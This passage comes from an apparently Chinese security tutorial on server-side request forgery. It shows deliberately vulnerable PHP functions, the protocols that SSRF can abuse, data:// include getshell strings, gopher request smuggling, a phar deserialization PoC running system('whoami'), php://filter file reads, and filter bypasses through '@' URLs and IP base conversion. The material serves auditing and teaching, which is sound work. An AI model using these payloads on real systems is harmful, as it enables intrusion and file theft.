title="PHP中的SSRF"></a>PHP中的SSRF</h3><p>在PHP中如<code>fsockopen()、pfsockopen()、file_get_contents()、show_source()、highlight_file()、curl_exec()、curl_multi_exec()、fopen()、readfile()、mysqli_connect()、include()、require()、file()、copy()</code>等函数使用过程中没有很好的对参数进行限制就可能导致SSRF漏洞。可以在php.net中搜索网络请求、套接字建立、数据库链接、文件操作相关的函数，部分函数使用的示例代码如下，代码审计时可根据关键字搜索函数进行分析：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">SSRF</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$url</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">port</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">SSRF_fsockopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">.</span><span class="token constant">__FUNCTION__</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">SSRF_pfsockopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">.</span><span class="token constant">__FUNCTION__</span> <span class="token punctuation">;</span>        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">pfsockopen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">SSRF_file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">.</span><span class="token constant">__FUNCTION__</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">SSRF_curl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">.</span><span class="token constant">__FUNCTION__</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置 URL 和相应的选项</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 抓取 URL 并把它传递给浏览器</span>        <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 关闭 cURL 资源，并且释放系统资源</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">SSRF_curl_multi_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">.</span><span class="token constant">__FUNCTION__</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 创建cURL资源</span>        <span class="token variable">$ch1</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置URL和相应的选项</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch1</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch1</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 创建批处理cURL句柄</span>        <span class="token variable">$mh</span> <span class="token operator">=</span> <span class="token function">curl_multi_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 增加2个句柄</span>        <span class="token function">curl_multi_add_handle</span><span class="token punctuation">(</span><span class="token variable">$mh</span><span class="token punctuation">,</span><span class="token variable">$ch1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$active</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 执行批处理句柄</span>        <span class="token keyword">do</span> <span class="token punctuation">{</span>            <span class="token variable">$mrc</span> <span class="token operator">=</span> <span class="token function">curl_multi_exec</span><span class="token punctuation">(</span><span class="token variable">$mh</span><span class="token punctuation">,</span> <span class="token variable">$active</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$mrc</span> <span class="token operator">==</span> <span class="token constant">CURLM_CALL_MULTI_PERFORM</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$active</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$mrc</span> <span class="token operator">==</span> <span class="token constant">CURLM_OK</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">curl_multi_select</span><span class="token punctuation">(</span><span class="token variable">$mh</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">do</span> <span class="token punctuation">{</span>                    <span class="token variable">$mrc</span> <span class="token operator">=</span> <span class="token function">curl_multi_exec</span><span class="token punctuation">(</span><span class="token variable">$mh</span><span class="token punctuation">,</span> <span class="token variable">$active</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$mrc</span> <span class="token operator">==</span> <span class="token constant">CURLM_CALL_MULTI_PERFORM</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 关闭全部句柄</span>        <span class="token function">curl_multi_remove_handle</span><span class="token punctuation">(</span><span class="token variable">$mh</span><span class="token punctuation">,</span> <span class="token variable">$ch1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_multi_close</span><span class="token punctuation">(</span><span class="token variable">$mh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">SSRF_fopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">.</span><span class="token constant">__FUNCTION__</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">SSRF_readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">.</span><span class="token constant">__FUNCTION__</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">SSRF_mysqli_connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">.</span><span class="token constant">__FUNCTION__</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">,</span> <span class="token string">"my_user"</span><span class="token punctuation">,</span> <span class="token string">"my_password"</span><span class="token punctuation">,</span> <span class="token string">"my_db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">SSRF_include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">.</span><span class="token constant">__FUNCTION__</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">include</span> <span class="token string">"$this->url"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">SSRF_require</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">.</span><span class="token constant">__FUNCTION__</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">require</span> <span class="token string">"$this->url"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$S</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SSRF</span><span class="token punctuation">;</span><span class="token variable">$S</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">SSRF_fsockopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//url=127.0.0.1&amp;port=9666</span><span class="token variable">$S</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">SSRF_pfsockopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//连接一直不会关闭, url=tcp://127.0.0.1&amp;port=9666 ,可用 ssl://,tls:// </span><span class="token variable">$S</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">SSRF_file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// url=http://127.0.0.1:9666/1.php</span><span class="token variable">$S</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">SSRF_curl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//url=http://127.0.0.1:9666/1.php</span><span class="token variable">$S</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">SSRF_curl_multi_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// url=http://127.0.0.1:9666/1.php</span><span class="token variable">$S</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">SSRF_fopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//配置php.ini allow_url_fopen=On,url=http://127.0.0.1:9666/1.php</span><span class="token variable">$S</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">SSRF_readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// url=http://127.0.0.1:9666/1.php</span><span class="token variable">$S</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">SSRF_mysqli_connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//url=127.0.0.1:9666</span><span class="token variable">$S</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">SSRF_include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//配置php.ini allow_url_include=On,需要文件名为.php,url=http://127.0.0.1:9666/1.php</span><span class="token variable">$S</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">SSRF_require</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//配置php.ini allow_url_include=On,需要文件名为.php,url=http://127.0.0.1:9666/1.php</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-SSRF可利用的协议"><a href="#0x04-SSRF可利用的协议" class="headerlink" title="0x04 SSRF可利用的协议"></a>0x04 SSRF可利用的协议</h2><h3 id="JAVA-SSRF可利用的协议"><a href="#JAVA-SSRF可利用的协议" class="headerlink" title="JAVA-SSRF可利用的协议"></a>JAVA-SSRF可利用的协议</h3><p>在JAVA中漏洞触发点支持的协议跟JDK版本和代码配置有关，有些类方法只能使用部分协议。更多详细信息参考<a href="https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf">OWASP资料</a>。</p><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/653360e24d3790514a6876eff77a949e.png"></p><p>经过测试在openjdk-JDK15中可以支持以下协议使用：<code>http、https、ftp、file、jar、mailto*</code>,openjdk9中移除了协议netdoc(<a href="https://bugs.openjdk.java.net/browse/JDK-8176351">issues</a>),JDK8中移除了gopher协议的支持。以webgoat靶场SSRF为例测试部分协议的使用，使用file协议读取文件/列目录(<code>file:///C:\\2.txt</code>)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/a55c4f5a2b0287f4ab2af71cd1c542d9.png"><br>jar协议读取本地文件(<code>jar:file:///D:\OneForAll.zip!/OneForAll/requirements.txt</code>):<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/72e9f8ce10bc11dd918f3339dbb5786c.png"><br>jar协议读取远程文件(<code>jar:https://x.x.x/xx.zip!/file.txt</code>)，同时会下载远程文件保存在本地缓存中：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/f4df4352acd32d913757c7503cdedcb4.png"></p><p><em>java.net.HttpURLConnection类转换</em><br>之前说到部分类支持的协议会进行限制，使用了HttpURLConnection对openConnection进行类型强制转换后的请求就只支持HTTP(S)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/92bafb6cbdd6274599adbfdded4c94ef.png"></p><p><em>mailto</em><br>mailto协议可以用来发送邮件，该协议的利用需要后端配置了邮件的发送服务器和相关的支持才能正常使用，协议格式如下：</p><pre class="line-numbers language-html"><code class="language-html">mailto:name1@rapidtables.com?cc=name2@rapidtables.com&amp;bcc=name3@rapidtables.com&amp;subject=The%20subject%20of%20the%20email&amp;body=The%20body%20of%20the%20email//抄送：name2@rapidtables.com//密送：name3@rapidtables.com//主题：The%20subject%20of%20the%20email//正文：The%20body%20of%20the%20email<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PHP-SSRF可利用的协议"><a href="#PHP-SSRF可利用的协议" class="headerlink" title="PHP-SSRF可利用的协议"></a>PHP-SSRF可利用的协议</h3><p>在PHP中支持的协议：</p><pre class="line-numbers language-html"><code class="language-html">dict:// — 词典网络协议(curl扩展支持)file:// — 访问本地文件系统http:// — 访问 HTTP(s) URLftp:// — 访问 FTP(s) URLphp:// — 访问各种 I/O 流zlib:// ——压缩流data:// — 数据 (RFC 2397)glob:// — 查找匹配模式的路径名phar:// — PHP 存档ssh2:// — 安全外壳 2rar:// — RARogg:// — 音频流expect:// —— 流程交互流gopher:// ——   https://zhuanlan.zhihu.com/p/112055947<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>DATA协议</em><br>data协议配合include(require) Getshell</p><pre class="line-numbers language-php"><code class="language-php">data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,&lt;?php%20phpinfo();</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b  (&lt;?php phpinfo();?>,+号使用url编码)</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//image/jpeg,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/49e2d53bc82df88fbccbc2fcf9a3b913.png"></p><p><em>DICT协议</em><br>DICT协议是词典网络协议，在<a href="http://www.dict.org/rfc2229.txt">RFC 2009</a>中进行描述，使用空格或者<code>:</code>作为分隔参数。在利用dict协议中，一行只能包括一行命令，不能输入多行命令(所以不能攻击认证的redis)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/0efaa0296941bab70e196afd822e1156.png"><br>对于<code>&lt;、?、:</code> 等特殊符号需要转为对应的16进制：</p><pre class="line-numbers language-llvm"><code class="language-llvm"><  = \x3c? => \x3f: => \x3a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em>Gopher</em><br>该协议在PHP中需要cURL扩展支持，使用<code>curl_exec()</code>,<code>curl_multi_exec()</code>函数发起请求。gopher协议格式为<code>gopher://IP:port/_{TCP/IP数据流}</code>，开始的<code>_</code>字符可以随意，数据流使用URL编码，在BurpSuite中利用SSRF-Gopher发起GET/POST请求：<br>1.复制请求体<br>2.使用Burp-Decoder模块URL编码<br>3.替换<code>%0a</code>/ <code>%0d%0a</code>为 <code>%250d%250a</code>或<code>%25%30%64%25%30%61</code>(换行符 <code>%0d%0a</code>的URL编码)</p><p>GET只需要链接地址即可：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/82af4021ee8fc5ac5f7af0ea100241dc.png"></p><p>POST需要包含关键请求头和POST数据：Content-Type,Content-Length,HOST,POST_DATA，将整个请求URL编码即可：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/4ab536ffff2d6fdcb2d1198bf21abd04.png"><br>需要对换行符编码替换，完成后使用Gopher发送：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/cab2d0a5b91e61d9037a6866b3262cf3.png"></p><p><em>PHAR</em><br>PHAR协议用于在PHP中解析phar文件，phar文件的meta-data字段存在反序列化漏洞，可以使用协议读取文件触发反序列化，漏洞代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phar文件POC:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token operator">=</span> <span class="token string">'system("whoami");'</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/f5a1bb51129b64015ee455d8b80ddc4a.png"></p><p><em>php://filter</em><br>读取本地文件并进行base64编码</p><pre class="line-numbers language-php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.base64-encode/resource=xx.xx</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=xx.xx</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/7090bbb36129f35e85d9f1d084319f29.png"></p><p><em>php://input</em><br>可以获取请求中的原始流，如读取POST输入流：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/d0002c2998a80484097fb73f1c03a459.png"></p><h2 id="0x05-SSRF常见的绕过方法"><a href="#0x05-SSRF常见的绕过方法" class="headerlink" title="0x05 SSRF常见的绕过方法"></a>0x05 SSRF常见的绕过方法</h2><p>在代码实现过程中，开发者为了防御SSRF漏洞，会对相关的请求进行验证(黑名单、白名单、正则匹配等)，但是其中一些过滤代码存在绕过的可能行，这里总结一些常见的绕过方法(部分方法只能在浏览器中或需要特定语言函数实现，需要结合场景使用，如进行一些社会工程学欺骗等)。</p><h3 id="URL中使用"><a href="#URL中使用" class="headerlink" title="URL中使用@"></a>URL中使用@</h3><p>URL(Uniform Resource Locator,统一资源定位符),用于在互联网中定位数据资源，其完整格式如下</p><pre class="line-numbers language-html"><code class="language-html">[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由格式可知，@符号之后是服务器的地址，可以用于在SSRF一些正则匹配中绕过，从而定位到@之后的服务器地址：</p><pre class="line-numbers language-html"><code class="language-html">http://google.com:80+&amp;@220.181.38.251:80/#+@google.com:80/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>CURL带着值为<code>qq.com:</code>的Authorization验证头访问百度：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/df256318675bbf844d7f1c41e67a46e0.png"></p><h3 id="IP的进制转换"><a href="#IP的进制转换" class="headerlink" title="IP的进制转换"></a>IP的进制转换</h3><p>IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。 <a href="https://github.com/vysecurity/IPFuscator">IPFuscator</a> 工具可实现IP地址的进制转换，包括了八进制、十进制、十六进制、混合进制。在这个工具的基础上添加了IPV6的转换和版本输出的优化：<br>在脚本对IP进行八进制转换时，一些情况下会在字符串末尾多加一个L:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/ebef0763696a578f8da207a40c0a4b9d.png"><br>这是因为在Python下区分了int和long类型，int数据超出最大值2147483647后会表示为long类型，体现在八进制转换后的字符串末尾跟了个L:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/f667f6740c6ba3fa397087900fdb6b92.png"><br>而在python3中都使用int处理，所以可以将脚本升级到Python来用，使用<code>2to3.py</code>工具<code>python3 2to3.py -w xx.py</code>转换代码：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/544129d9ff196b2905f80daa608bd0f0.png"><br>然后可以用python3来执行，但是在使用oct()转八进制的时候，有0o标记，这种的在访问时浏览器识别不了：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/dc7a34595ab480c2a18d1c39db24803c.png"><br>使用<code>'0{0:o}'.format(int(5))</code>来代替oct(),修改后的<a href="https://raw.githubusercontent.com/yanghaoi/Script/main/Python/ipfuscator.py">源码</a>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/35395e225c334651964ffe8f0d77fafa.png"><br>也可以使用IPy模块进行转换：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> IPy<span class="token comment" 